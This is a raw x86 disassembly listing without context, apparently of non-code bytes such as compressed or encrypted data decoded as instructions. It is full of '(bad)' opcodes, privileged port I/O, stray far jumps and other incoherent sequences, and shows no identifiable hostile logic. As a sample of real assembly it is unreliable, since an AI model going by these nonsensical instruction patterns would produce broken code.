  42c918:	pop    ecx
  42c919:	push   esi
  42c91a:	pop    edi
  42c91b:	adc    BYTE PTR [ecx],0x6d
  42c91e:	fist   DWORD PTR [esi-0x424f854a]
  42c924:	and    ebx,ecx
  42c926:	xchg   ebp,eax
  42c927:	push   ebp
  42c928:	add    ah,BYTE PTR [esi-0x8]
  42c92b:	das    
  42c92c:	mov    dh,0xa2
  42c92e:	fiadd  DWORD PTR [ecx]
  42c930:	ficomp WORD PTR [ebx+0x6d7e796f]
  42c936:	popa   
  42c937:	(bad)  [esi-0xa461667]
  42c93d:	inc    esp
  42c93e:	stos   BYTE PTR es:[edi],al
  42c93f:	jle    0x42c920
  42c941:	cmc    
  42c942:	push   cs
  42c943:	test   al,0xdd
  42c945:	mov    dh,0xad
  42c947:	outs   dx,BYTE PTR ds:[esi]
  42c948:	pop    es
  42c949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c94a:	cmp    BYTE PTR [ebp+eax*1+0x4f],ch
  42c94e:	xor    ch,BYTE PTR [ebp-0x257e9dda]
  42c954:	add    edx,edi
  42c956:	adc    DWORD PTR [eax-0x71],0xd1576162
  42c95d:	shl    DWORD PTR [eax],0x8f
  42c960:	mov    ds:0xdb54d07c,eax
  42c965:	mov    dh,0xad
  42c967:	stos   DWORD PTR es:[edi],eax
  42c968:	and    DWORD PTR [edx],edi
  42c96a:	xor    al,BYTE PTR [ecx+0x2c]
  42c96d:	push   eax
  42c96e:	je     0x42c938
  42c970:	dec    edx
  42c971:	push   ecx
  42c972:	fiadd  DWORD PTR [ecx+0x75]
  42c975:	and    DWORD PTR [edx-0x6c],eax
  42c978:	cmp    DWORD PTR [esi+eiz*1-0x2b],eax
  42c97c:	push   esp
  42c97d:	fstp   TBYTE PTR [edx+0x67673506]
  42c983:	jne    0x42c9d2
  42c985:	lock push ds
  42c987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c988:	loopne 0x42c940
  42c98a:	cmc    
  42c98b:	cs aam 0x1
  42c98e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c98f:	repnz aas 
  42c991:	dec    edi
  42c992:	scas   al,BYTE PTR es:[edi]
  42c993:	sbb    dh,BYTE PTR [edi+0x18c08dd2]
  42c999:	mov    al,0x80
  42c99b:	mov    al,0xb0
  42c99d:	lods   eax,DWORD PTR ds:[esi]
  42c99e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c99f:	imul   esp,DWORD PTR ss:[ebx+0x63],0xffffffdb
  42c9a4:	stos   BYTE PTR es:[edi],al
  42c9a5:	sub    eax,0xf1c9591d
  42c9aa:	mov    cl,0xce
  42c9ac:	mov    dl,0xda
  42c9ae:	test   DWORD PTR [ebp+0x61],ebp
  42c9b1:	fucom  st(2)
  42c9b3:	lds    esi,FWORD PTR [eax+0x38b20d33]
  42c9b9:	jp     0x42ca23
  42c9bb:	sbb    ebx,DWORD PTR [ebx]
  42c9bd:	aaa    
  42c9be:	sub    dh,dh
  42c9c0:	ja     0x42c95b
  42c9c2:	cdq    
  42c9c3:	ins    BYTE PTR es:[edi],dx
  42c9c4:	mov    esi,0x6e8a6bd1
  42c9c9:	add    eax,0x637f41a6
  42c9ce:	ja     0x42c970
  42c9d0:	push   eax
  42c9d1:	xchg   esi,eax
  42c9d2:	lea    esi,[esi+0x6b]
  42c9d5:	fst    DWORD PTR [ebp-0x4a]
  42c9d8:	mov    al,ds:0x8a2df0bc
  42c9dd:	adc    edx,DWORD PTR [eax]
  42c9df:	pop    ss
  42c9e0:	xchg   esi,eax
  42c9e1:	mov    al,0xb3
  42c9e3:	inc    eax
  42c9e4:	arpl   WORD PTR [edx+edx*4+0x43],bx
  42c9e8:	mov    ch,0x9
  42c9ea:	pusha  
  42c9eb:	dec    ebx
  42c9ec:	stc    
  42c9ed:	into   
  42c9ee:	mov    ebp,0x62ba5fa1
  42c9f3:	loope  0x42ca4b
  42c9f5:	test   DWORD PTR [ebp+0x447f53f7],eax
  42c9fb:	aas    
  42c9fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c9fd:	stos   BYTE PTR es:[edi],al
  42c9fe:	xor    ah,al
  42ca00:	test   DWORD PTR [eax-0x3c],edx
  42ca03:	push   esp
  42ca04:	idiv   BYTE PTR [ebx+0x51dad8b9]
  42ca0a:	in     eax,dx
  42ca0b:	mov    al,ds:0x4e831284
  42ca10:	mov    cl,0x32
  42ca12:	or     BYTE PTR [ebx-0x7b],0x5b
  42ca16:	clc    
  42ca17:	inc    edi
  42ca18:	dec    eax
  42ca19:	xchg   esp,eax
  42ca1a:	pop    ss
  42ca1b:	imul   ebp,DWORD PTR [ecx-0x1b],0xffffffdf
  42ca1f:	mov    al,ds:0xb9e15029
  42ca24:	and    al,cl
  42ca26:	add    BYTE PTR [eax],ch
  42ca28:	ins    DWORD PTR es:[edi],dx
  42ca29:	add    BYTE PTR [eax-0x1e],cl
  42ca2c:	inc    esi
  42ca2d:	push   ebx
  42ca2e:	aam    0x5e
  42ca30:	out    0x1,al
  42ca32:	rcl    BYTE PTR [edi+0x45],1
  42ca35:	jmp    0x6a37:0xa6a5805b
  42ca3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca3d:	call   0x616662e5
  42ca42:	leave  
  42ca43:	push   esp
  42ca44:	imul   ecx,edx,0x5b
  42ca47:	or     ebp,esi
  42ca49:	mov    ds:0x836aabd6,eax
  42ca4e:	pusha  
  42ca4f:	stos   DWORD PTR es:[edi],eax
  42ca50:	mov    es,esp
  42ca52:	cs je  0x42ca69
  42ca55:	mov    al,0xb1
  42ca57:	(bad)  
  42ca58:	jmp    0x7a8ffcbd
  42ca5d:	mov    al,ds:0x306e0886
  42ca62:	jae    0x42ca01
  42ca64:	adc    cl,bh
  42ca66:	or     ch,BYTE PTR [esi]
  42ca68:	dec    ebx
  42ca69:	lods   eax,DWORD PTR ds:[esi]
  42ca6a:	push   edx
  42ca6b:	fisttp QWORD PTR [ebx-0x5a2efda5]
  42ca71:	test   DWORD PTR [esi],esp
  42ca73:	scas   eax,DWORD PTR es:[edi]
  42ca74:	repnz sub BYTE PTR [edx],dl
  42ca77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca78:	pop    eax
  42ca79:	jmp    0x42c9fd
  42ca7b:	loop   0x42cac3
  42ca7d:	sti    
  42ca7e:	loop   0x42cac5
  42ca80:	inc    ecx
  42ca81:	enter  0x415a,0x46
  42ca85:	mov    al,0xd0
  42ca87:	mov    BYTE PTR [edx+0x79],ch
  42ca8a:	pop    esp
  42ca8b:	lods   eax,DWORD PTR ds:[esi]
  42ca8c:	dec    edi
  42ca8d:	ins    DWORD PTR es:[edi],dx
  42ca8e:	pop    ebx
  42ca8f:	jecxz  0x42ca47
  42ca91:	mov    al,0xd6
  42ca93:	dec    edi
  42ca94:	loop   0x42cafc
  42ca96:	(bad)  
  42ca97:	xor    al,0xcf
  42ca99:	in     eax,dx
  42ca9a:	sbb    eax,0xba003a7c
  42ca9f:	ins    DWORD PTR es:[edi],dx
  42caa0:	push   esi
  42caa1:	add    DWORD PTR [edi-0x4de0e8d4],esp
  42caa7:	or     BYTE PTR [eax+0x6b],ah
  42caaa:	stos   DWORD PTR es:[edi],eax
  42caab:	adc    BYTE PTR [ebx+ecx*4+0xc],cl
  42caaf:	ins    DWORD PTR es:[edi],dx
  42cab0:	mov    bh,0xad
  42cab2:	ins    DWORD PTR es:[edi],dx
  42cab3:	out    dx,eax
  42cab4:	pop    ds
  42cab5:	mov    esp,0xfe407738
  42caba:	mov    dl,0x82
  42cabc:	lds    esi,FWORD PTR [esi+0x130a05c2]
  42cac2:	and    al,0xf4
  42cac4:	mov    edx,0x346ea962
  42cac9:	add    BYTE PTR [edi-0x18bc6305],dh
  42cacf:	push   ss
  42cad0:	jnp    0x42cad6
  42cad2:	and    al,0x5b
  42cad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cad5:	mov    al,ds:0xd8c217a9
  42cada:	fs arpl bx,bx
  42cadd:	mov    dh,0xe
  42cadf:	test   al,0x73
  42cae1:	daa    
  42cae2:	jo     0x42cad3
  42cae4:	xchg   esi,eax
  42cae5:	sti    
  42cae6:	mov    ebp,0xa580a1ec
  42caeb:	ins    DWORD PTR es:[edi],dx
  42caec:	adc    BYTE PTR [eax],cl
  42caee:	out    0x29,eax
  42caf0:	cmp    dl,BYTE PTR ds:0xf6d4135b
  42caf6:	xchg   edx,eax
  42caf7:	out    0x74,eax
  42caf9:	cld    
  42cafa:	xlat   BYTE PTR ds:[ebx]
  42cafb:	fimul  WORD PTR [edi-0x49ea92d7]
  42cb01:	sbb    eax,DWORD PTR [edx+0x4e]
  42cb04:	and    eax,0xbb31f04d
  42cb09:	ror    BYTE PTR ds:[ebx+0x5ec757ed],1
  42cb10:	addr16 mov al,0x74
  42cb13:	aas    
  42cb14:	lea    ecx,[esi]
  42cb16:	loop   0x42cb1a
  42cb18:	push   eax
  42cb19:	aam    0x81
  42cb1b:	loope  0x42cad1
  42cb1d:	mov    bh,0xb6
  42cb1f:	sub    eax,0xe322b82d
  42cb24:	pop    ebx
  42cb25:	addr16 into 
  42cb27:	cmp    al,0xf2
  42cb29:	xor    BYTE PTR [eax+0x51],ch
  42cb2c:	ins    BYTE PTR es:[edi],dx
  42cb2d:	sub    ah,al
  42cb2f:	xlat   BYTE PTR ds:[ebx]
  42cb30:	ss loop 0x42cae9
  42cb33:	mov    ebp,0x5f0176d0
  42cb38:	loopne 0x42cac9
  42cb3a:	jmp    0xadb7:0x14c2867d
  42cb41:	adc    BYTE PTR [edx+edx*4+0x23e1621c],al
  42cb48:	jbe    0x42cbc3
  42cb4a:	imul   eax,DWORD PTR [edi-0x75],0xa18360d6
  42cb51:	add    BYTE PTR [esi],cl
  42cb53:	dec    ebx
  42cb54:	sub    ch,BYTE PTR [edi]
  42cb56:	test   eax,0xcba16968
  42cb5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb5c:	in     al,dx
  42cb5d:	mov    ecx,0xae85d0ed
  42cb62:	pusha  
  42cb63:	cmp    esp,ebx
  42cb65:	xchg   ebp,eax
  42cb66:	shl    edi,cl
  42cb68:	sahf   
  42cb69:	outs   dx,BYTE PTR ds:[esi]
  42cb6a:	sub    eax,0x8d350d6c
  42cb6f:	and    BYTE PTR [esi+edx*1-0x684eaafa],bl
  42cb76:	sub    eax,0xc8db5b6c
  42cb7b:	push   ebx
  42cb7c:	or     DWORD PTR [edi-0x41920a0b],0xffffff8a
  42cb83:	add    DWORD PTR ss:0xdb7c1251,ebp
  42cb8a:	ja     0x42cbec
  42cb8c:	ins    DWORD PTR es:[edi],dx
  42cb8d:	popa   
  42cb8e:	jmp    0x42cbb0
  42cb90:	fisttp DWORD PTR [esi+0x76319cfe]
  42cb96:	mov    WORD PTR [ebx],gs
  42cb98:	xor    al,0xca
  42cb9a:	lea    ecx,[esi]
  42cb9c:	mov    ah,0xf4
  42cb9e:	pop    ebp
  42cb9f:	mov    ds:0xdcbc1480,al
  42cba4:	push   esi
  42cba5:	push   ebp
  42cba6:	dec    esp
  42cba7:	sbb    DWORD PTR [edi],eax
  42cba9:	jae    0x42cc17
  42cbab:	mov    ds:0x1b9900ba,al
  42cbb0:	int3   
  42cbb1:	ins    BYTE PTR es:[edi],dx
  42cbb2:	repnz mov bh,0x8a
  42cbb5:	dec    ebx
  42cbb6:	dec    ebx
  42cbb7:	pop    ds
  42cbb8:	push   0xb0ceda42
  42cbbd:	jmp    0x42cb81
  42cbbf:	or     bl,bl
  42cbc1:	lea    eax,[esi-0xf0c66b8]
  42cbc7:	stc    
  42cbc8:	mov    esp,0x5c68707f
  42cbcd:	fcom   DWORD PTR [esi]
  42cbcf:	mov    esi,0x8e965fdb
  42cbd4:	xor    eax,0xd0b872f4
  42cbd9:	push   esp
  42cbda:	pop    esp
  42cbdb:	xor    ecx,edx
  42cbdd:	xchg   esp,eax
  42cbde:	mov    ch,0xc2
  42cbe0:	jns    0x42cc2e
  42cbe2:	or     al,0xdc
  42cbe4:	fdivr  DWORD PTR [edx]
  42cbe6:	mov    al,dh
  42cbe8:	mov    WORD PTR [edi+eiz*1-0x4f],ds
  42cbec:	push   esp
  42cbed:	cld    
  42cbee:	add    BYTE PTR [eax+edi*1+0x15],bl
  42cbf2:	clc    
  42cbf3:	and    dh,BYTE PTR [edx+0x6fca17c5]
  42cbf9:	or     eax,0x8bda780f
  42cbfe:	inc    edi
  42cbff:	add    BYTE PTR [esi],ah
  42cc01:	in     al,dx
  42cc02:	and    bl,BYTE PTR [ecx+eax*4+0x1]
  42cc06:	sbb    ecx,DWORD PTR ds:0x72ca0a50
  42cc0c:	push   0xa1688342
  42cc11:	data16 jg 0x42cbac
  42cc14:	inc    BYTE PTR [edi]
  42cc16:	call   0x3656:0x1fdb6e00
  42cc1d:	cmc    
  42cc1e:	inc    BYTE PTR [esi+eiz*1+0x5452b68b]
  42cc25:	or     bl,BYTE PTR [ebp-0x5c]
  42cc28:	pop    DWORD PTR [ecx]
  42cc2a:	adc    al,0x74
  42cc2c:	fcmovnu st,st(2)
  42cc2e:	xchg   BYTE PTR [ebp+0x10],bl
  42cc31:	jne    0x42cbf8
  42cc33:	sub    eax,0x45a174ac
  42cc38:	aam    0x9b
  42cc3a:	das    
  42cc3b:	ss pop eax
  42cc3d:	and    eax,0xc58d51cd
  42cc42:	mov    dh,0xa4
  42cc44:	jmp    0x15d355fc
  42cc49:	fcomp  DWORD PTR [edx]
  42cc4b:	add    bl,al
  42cc4d:	retf   0x5b2
  42cc50:	gs into 
  42cc52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cc53:	test   DWORD PTR [ebx+0x3],ebx
  42cc56:	test   al,0x5d
  42cc58:	addr16 pop es
  42cc5a:	loope  0x42ccac
  42cc5c:	inc    eax
  42cc5d:	or     BYTE PTR [edx],0xdb
  42cc60:	xchg   esi,eax
  42cc61:	cmp    al,BYTE PTR [edx-0x1cb35cee]
  42cc67:	dec    eax
  42cc68:	mov    ecx,0x6d8529b5
  42cc6d:	mov    esi,DWORD PTR [esi-0x2c]
  42cc70:	push   edx
  42cc71:	dec    esi
  42cc72:	or     al,0xea
  42cc74:	retf   
  42cc75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc76:	mov    dl,0x4
  42cc78:	mov    bh,0x85
  42cc7a:	lods   eax,DWORD PTR ds:[esi]
  42cc7b:	stos   DWORD PTR es:[edi],eax
  42cc7c:	push   ebp
  42cc7d:	mov    ds:0xb2650276,al
  42cc82:	push   ebx
  42cc83:	adc    eax,0x514db6b6
  42cc88:	les    ecx,FWORD PTR [eax+edi*8+0x1b]
  42cc8c:	shr    DWORD PTR cs:[edi-0x47d64bd8],cl
  42cc93:	sbb    ebx,0x61
  42cc96:	stc    
  42cc97:	pop    edi
  42cc98:	sub    esi,DWORD PTR [edi-0x28]
  42cc9b:	fcmovu st,st(0)
  42cc9d:	pop    eax
  42cc9e:	imul   DWORD PTR [esi-0x1edb4313]
  42cca4:	in     eax,0x72
  42cca6:	inc    edx
  42cca7:	mov    al,0x95
  42cca9:	sbb    BYTE PTR [esi-0x7a],0x29
  42ccad:	adc    al,0x80
  42ccaf:	test   DWORD PTR [eax-0x92be32e],eax
  42ccb5:	nop
  42ccb6:	les    eax,FWORD PTR [ebp-0xb937c53]
  42ccbc:	clc    
  42ccbd:	lea    eax,[ecx]
  42ccbf:	mov    cl,0xc7
  42ccc1:	lods   eax,DWORD PTR ds:[esi]
  42ccc2:	or     ebp,DWORD PTR [eax+0x7]
  42ccc5:	mov    edi,0x8db64ea8
  42ccca:	popa   
  42cccb:	lods   eax,DWORD PTR ds:[esi]
  42cccc:	jno    0x42cca9
  42ccce:	fiadd  DWORD PTR [edi+0x70e323a5]
  42ccd4:	push   eax
  42ccd5:	in     al,dx
  42ccd6:	(bad)  
  42ccd7:	int3   
  42ccd8:	fwait
  42ccd9:	xchg   esi,eax
  42ccda:	add    edx,0xffffff8d
  42ccdd:	ror    DWORD PTR [eax+edi*8],cl
  42cce0:	sti    
  42cce1:	mov    dl,0x32
  42cce3:	pop    ebx
  42cce4:	fdiv   DWORD PTR cs:[esi-0x73a22713]
  42cceb:	sbb    eax,0x8f8d438
  42ccf0:	mov    DWORD PTR [edx-0x47],0x4a7cab81
  42ccf7:	mov    eax,ds:0xab8a4e7
  42ccfc:	pop    ebx
  42ccfd:	add    eax,0x47bd95ed
  42cd02:	jae    0x42cd05
  42cd04:	xchg   esp,eax
  42cd05:	push   ecx
  42cd06:	pop    ss
  42cd07:	fadd   DWORD PTR ss:0xe865e946
  42cd0e:	lods   eax,DWORD PTR ds:[esi]
  42cd0f:	jge    0x42ccc6
  42cd11:	test   eax,0xd975d4b8
  42cd16:	mov    dh,0x7b
  42cd18:	hlt    
  42cd19:	pop    esi
  42cd1a:	fnstsw WORD PTR [edi]
  42cd1c:	mov    edx,0x9f036db5
  42cd21:	sbb    eax,0xf221838a
  42cd26:	clc    
  42cd27:	or     ah,dh
  42cd29:	mov    bh,0xd6
  42cd2b:	lods   eax,DWORD PTR ds:[esi]
  42cd2c:	sub    edx,DWORD PTR [ecx+0x7b694d61]
  42cd32:	xchg   edi,eax
  42cd33:	push   cs
  42cd34:	or     eax,0xddb15109
  42cd39:	push   0x20
  42cd3b:	dec    ecx
  42cd3c:	cmp    BYTE PTR [eax+0x6c2f265],ch
  42cd42:	pusha  
  42cd43:	(bad)  ds:0x74c52a9a
  42cd49:	div    BYTE PTR [eax]
  42cd4b:	push   es
  42cd4c:	ins    DWORD PTR es:[edi],dx
  42cd4d:	add    eax,ecx
  42cd4f:	lea    esp,[ebp+0x212d429e]
  42cd55:	pusha  
  42cd56:	dec    edx
  42cd57:	test   eax,0xf9615b0b
  42cd5c:	add    al,0xaf
  42cd5e:	mov    esp,0xd45dffa
  42cd63:	add    ecx,DWORD PTR [esi-0x4d1576a0]
  42cd69:	leave  
  42cd6a:	push   edx
  42cd6b:	retf   0x5c68
  42cd6e:	fcomp  st(2)
  42cd70:	lds    ecx,FWORD PTR [eax+ebp*2]
  42cd73:	pop    ss
  42cd74:	xchg   ecx,eax
  42cd75:	jo     0x42cdc0
  42cd77:	mov    eax,0xb6c2db93
  42cd7c:	loope  0x42cd2c
  42cd7e:	jle    0x42cdd1
  42cd80:	cwde   
  42cd81:	cmp    al,0xb5
  42cd83:	jmp    0xa00e:0x8b9b8bec
  42cd8a:	xchg   ebp,eax
  42cd8b:	or     eax,0x60fe69f0
  42cd90:	lods   eax,DWORD PTR ds:[esi]
  42cd91:	mov    eax,DWORD PTR [edx-0x207570f5]
  42cd97:	dec    ebx
  42cd98:	ds enter 0xfa8b,0xc1
  42cd9d:	(bad)  
  42cd9e:	push   ss
  42cd9f:	ins    BYTE PTR es:[edi],dx
  42cda0:	sub    DWORD PTR [ebx+0x6b],0xed2ac983
  42cda7:	(bad)  
  42cda8:	inc    eax
  42cda9:	mov    al,0x20
  42cdab:	adc    al,0xbf
  42cdad:	mov    ah,0x44
  42cdaf:	int    0x1b
  42cdb1:	gs mov ebx,0x8d1bb602
  42cdb7:	les    ecx,FWORD PTR [ebx-0x23]
  42cdba:	stos   BYTE PTR es:[edi],al
  42cdbb:	add    BYTE PTR [ecx],ch
  42cdbd:	cmp    al,0x8
  42cdbf:	mov    eax,0xdce51175
  42cdc4:	push   eax
  42cdc5:	das    
  42cdc6:	jno    0x42cda2
  42cdc8:	lods   eax,DWORD PTR ds:[esi]
  42cdc9:	ins    DWORD PTR es:[edi],dx
  42cdca:	sbb    edx,DWORD PTR [ebx+ecx*1+0x38510b19]
  42cdd1:	lods   eax,DWORD PTR ds:[esi]
  42cdd2:	dec    ecx
  42cdd3:	jle    0x42cdef
  42cdd5:	push   0x6c
  42cdd7:	pop    ss
  42cdd8:	xchg   esi,eax
  42cdd9:	lds    ecx,FWORD PTR [ecx]
  42cddb:	les    ebx,FWORD PTR [ebx*4+0x687b49ec]
  42cde2:	mov    al,bl
  42cde4:	and    BYTE PTR [ecx],dl
  42cde6:	sbb    ah,BYTE PTR [ebx]
  42cde8:	mov    al,ds:0xdd2dadc3
  42cded:	xchg   ebx,eax
  42cdee:	pop    ecx
  42cdef:	pop    edx
  42cdf0:	push   esi
  42cdf1:	sbb    BYTE PTR [ecx+edx*1+0x6b31b58e],cl
  42cdf8:	xchg   edi,eax
  42cdf9:	mov    esi,0xe69659ed
  42cdfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cdff:	push   esi
  42ce00:	sub    al,BYTE PTR ds:0x4d14dd94
  42ce06:	mov    ds:0xf076db6d,al
  42ce0b:	xor    DWORD PTR [esi],esp
  42ce0d:	cmp    dl,BYTE PTR [ebp+0x11f95fbd]
  42ce13:	ins    DWORD PTR es:[edi],dx
  42ce14:	stc    
  42ce15:	inc    edx
  42ce16:	xor    esp,0xc73516
  42ce1c:	xchg   ebx,eax
  42ce1d:	ret    
  42ce1e:	rcl    eax,1
  42ce20:	jle    0x42ce8e
  42ce22:	mov    bh,0x8e
  42ce24:	mov    dh,0x1e
  42ce26:	lahf   
  42ce27:	into   
  42ce28:	and    BYTE PTR [eax-0x5e],0xad
  42ce2c:	cmp    ch,al
  42ce2e:	ins    DWORD PTR es:[edi],dx
  42ce2f:	jnp    0x42cdeb
  42ce31:	test   DWORD PTR [ebx+eax*8],ebp
  42ce34:	dec    edx
  42ce35:	call   0x6e94:0x7cec59e
  42ce3c:	in     eax,dx
  42ce3d:	inc    edx
  42ce3e:	push   edi
  42ce3f:	inc    ebp
  42ce40:	jp     0x42ce18
  42ce42:	mov    WORD PTR [ebp+0x1ebee986],cs
  42ce48:	adc    al,0xb4
  42ce4a:	mov    edx,ebx
  42ce4c:	inc    esp
  42ce4d:	cmp    edx,DWORD PTR [esp+ecx*8-0x7d92e010]
  42ce54:	fsub   DWORD PTR [ecx+0x6d16fc92]
  42ce5a:	inc    ebp
  42ce5b:	jo     0x42cea4
  42ce5d:	jne    0x42ce4a
  42ce5f:	sub    BYTE PTR [esi+0x621c0e65],dh
  42ce65:	jno    0x42cdf3
  42ce67:	neg    DWORD PTR [eax+0x45d0b4ba]
  42ce6d:	out    0x2f,al
  42ce6f:	add    al,0x1
  42ce71:	clc    
  42ce72:	push   cs
  42ce73:	ror    BYTE PTR [esi],1
  42ce75:	fucomp st(0)
  42ce77:	mov    al,ds:0xeba2ff73
  42ce7c:	enter  0xadf8,0xdd
  42ce80:	fisubr DWORD PTR [esi]
  42ce82:	fcomp  st(4)
  42ce84:	xchg   ebp,eax
  42ce85:	add    ch,BYTE PTR [ebx+0x2e]
  42ce88:	fwait
  42ce89:	inc    ch
  42ce8b:	pop    ebp
  42ce8c:	pop    eax
  42ce8d:	push   0xd8bf8fb7
  42ce92:	jnp    0x42cef6
  42ce94:	std    
  42ce95:	retf   0x3291
  42ce98:	test   ah,0xad
  42ce9b:	stos   DWORD PTR es:[edi],eax
  42ce9c:	clc    
  42ce9d:	add    ah,dl
  42ce9f:	loop   0x42ceda
  42cea1:	loope  0x42ced2
  42cea3:	xchg   edi,eax
  42cea5:	fcmovnb st,st(6)
  42cea7:	(bad)  
  42cea8:	push   esp
  42cea9:	mov    WORD PTR [esi],?
  42ceab:	pop    esp
  42ceac:	mov    edx,ebp
  42ceae:	std    
  42ceaf:	mov    esp,0x86b70b44
  42ceb4:	cmp    cl,0xde
  42ceb7:	add    DWORD PTR ds:0x8e436a7f,eax
  42cebd:	sbb    ecx,DWORD PTR [ebx+0x5d]
  42cec0:	push   ecx
  42cec1:	pusha  
  42cec2:	cwde   
  42cec3:	imul   ecx,DWORD PTR [edi-0x4c],0x40
  42cec7:	pop    edx
  42cec8:	mov    bh,0x8e
  42ceca:	sbb    bl,0x2
  42cecd:	mov    ah,0x9e
  42cecf:	out    dx,eax
  42ced0:	mov    dl,0xac
  42ced2:	sbb    ecx,ebx
  42ced4:	aaa    
  42ced5:	or     DWORD PTR ss:[ebp+0x3efe9f],ecx
  42cedc:	ret    
  42cedd:	mov    dl,0x3c
  42cedf:	scas   al,BYTE PTR es:[edi]
  42cee0:	pusha  
  42cee1:	pop    ebx
  42cee2:	outs   dx,BYTE PTR ds:[esi]
  42cee3:	ins    BYTE PTR es:[edi],dx
  42cee4:	fisub  DWORD PTR [esi-0x43d8c358]
  42ceea:	sbb    dh,BYTE PTR [ebp+0x1]
  42ceed:	mov    ch,0xdd
  42ceef:	sbb    dh,BYTE PTR [ebx-0x35]
  42cef2:	je     0x42ce9c
  42cef4:	push   esi
  42cef5:	jecxz  0x42ce7d
  42cef7:	sub    al,0x7f
  42cef9:	mov    ebx,0xf9fbbad1
  42cefe:	mov    bl,0xf6
  42cf00:	ror    DWORD PTR [edi+0x7d7500],1
  42cf06:	cmp    DWORD PTR ds:0x2e028688,ecx
  42cf0c:	cmp    eax,0x1a8d69f4
  42cf11:	add    eax,0xbaa5002d
  42cf16:	cmp    al,0x6d
  42cf18:	stos   DWORD PTR es:[edi],eax
  42cf19:	sub    DWORD PTR [esi+0x17091a36],esi
  42cf1f:	jmp    0x42ceb5
  42cf21:	sub    dh,dh
  42cf23:	mov    ?,WORD PTR [esi]
  42cf25:	aad    0x6d
  42cf27:	arpl   WORD PTR [ecx-0x25885fdf],bp
  42cf2d:	jns    0x42cfa0
  42cf2f:	jecxz  0x42cfb0
  42cf31:	mov    dh,0xda
  42cf33:	push   es
  42cf34:	sub    BYTE PTR [esi-0x18],cl
  42cf37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf38:	pop    ecx
  42cf39:	mov    esi,0x6d007210
  42cf3e:	pop    ss
  42cf3f:	xchg   ecx,eax
  42cf40:	and    BYTE PTR ds:0x9652a4e0,0xda
  42cf47:	ins    DWORD PTR es:[edi],dx
  42cf48:	mov    edi,ebx
  42cf4a:	mov    bh,0x71
  42cf4c:	ins    BYTE PTR es:[edi],dx
  42cf4d:	sub    eax,0x822b0e08
  42cf52:	pop    ds
  42cf53:	pop    ebp
  42cf54:	fidiv  DWORD PTR [esi-0x21778bfc]
  42cf5a:	fs pop esi
  42cf5c:	mov    ecx,edx
  42cf5e:	or     eax,0xa9bb0eb6
  42cf63:	fisubr DWORD PTR [esi-0x47]
  42cf66:	ret    0xfa9
  42cf69:	mov    bh,0x76
  42cf6b:	(bad)  [edx]
  42cf6d:	cld    
  42cf6e:	sti    
  42cf6f:	mov    ah,0x6f
  42cf71:	mov    eax,ds:0xac45691a
  42cf76:	xor    BYTE PTR [ebp-0x65],ch
  42cf79:	or     BYTE PTR [esi+0x1285e01c],dh
  42cf7f:	aas    
  42cf80:	int3   
  42cf81:	bound  ecx,QWORD PTR [ecx]
  42cf83:	in     eax,dx
  42cf84:	pushaw 
  42cf86:	mov    ds:0x1beba8e0,eax
  42cf8b:	adc    DWORD PTR [edx+0x2a6b097],esi
  42cf91:	outs   dx,BYTE PTR ds:[esi]
  42cf92:	ins    DWORD PTR es:[edi],dx
  42cf93:	inc    ecx
  42cf94:	jmp    0x42cfd9
  42cf96:	add    eax,0x55d6dc55
  42cf9b:	rcl    esi,0xa
  42cf9e:	sub    al,0xee
  42cfa0:	pop    esi
  42cfa1:	fwait
  42cfa2:	jg     0x42cf7e
  42cfa4:	mov    bh,0xe
  42cfa6:	sub    ch,0xb1
  42cfa9:	and    al,0xc2
  42cfab:	pop    edx
  42cfac:	mov    ds:0x81b0f8dc,al
  42cfb1:	or     dh,BYTE PTR [edi+edx*2]
  42cfb4:	ins    DWORD PTR es:[edi],dx
  42cfb5:	mov    al,0xce
  42cfb7:	popf   
  42cfb8:	lea    eax,[ecx-0x25f4a4f5]
  42cfbe:	in     al,dx
  42cfbf:	inc    ebx
  42cfc0:	aam    0xb9
  42cfc2:	or     BYTE PTR [edx+0x2ed5b0e7],al
  42cfc8:	ins    DWORD PTR es:[edi],dx
  42cfc9:	xlat   BYTE PTR ds:[ebx]
  42cfca:	adc    DWORD PTR [ebx+0x34],0x73371457
  42cfd1:	mov    bh,0x6
  42cfd3:	cmp    BYTE PTR [eax-0x3a8ce99],0xe2
  42cfda:	loopne 0x42cfdf
  42cfdc:	lock sub dh,BYTE PTR [esi+0x51]
  42cfe0:	ins    DWORD PTR es:[edi],dx
  42cfe1:	sub    al,0x10
  42cfe3:	cwde   
  42cfe4:	mov    ah,0x83
  42cfe6:	(bad)  
  42cfe7:	fcmovnu st,st(2)
  42cfe9:	mov    ss,edi
  42cfeb:	aad    0xeb
  42cfed:	pop    ss
  42cfee:	pop    esp
  42cfef:	(bad)  
  42cff0:	sti    
  42cff1:	arpl   WORD PTR [eax],ax
  42cff3:	xor    al,0xb6
  42cff5:	lods   eax,DWORD PTR ds:[esi]
  42cff6:	repz push 0xffffffb0
  42cff9:	adc    DWORD PTR [edx-0x524834b5],ecx
  42cfff:	mov    ebp,0xbfe36a9b
  42d004:	dec    eax
  42d005:	add    BYTE PTR [ecx+0x54bd8cef],bl
  42d00b:	sbb    eax,DWORD PTR [eax-0x11a05e92]
  42d011:	inc    edi
  42d012:	dec    ebp
  42d013:	cmp    ebp,ebx
  42d015:	fiadd  DWORD PTR ds:0x42499830
  42d01b:	mov    bl,0xb6
  42d01d:	bound  esp,QWORD PTR [eax+0x1d8034c]
  42d023:	mov    cl,0xe9
  42d025:	pop    ebp
  42d026:	cwde   
  42d027:	add    ah,BYTE PTR [ebp+edx*4-0x4a81dd65]
  42d02e:	add    edx,DWORD PTR [edi+0x53]
  42d031:	repz (bad) 
  42d033:	lock shl DWORD PTR [edi],cl
  42d036:	rol    DWORD PTR [eax+0x5d],1
  42d039:	push   0x1d
  42d03b:	enter  0x1811,0xab
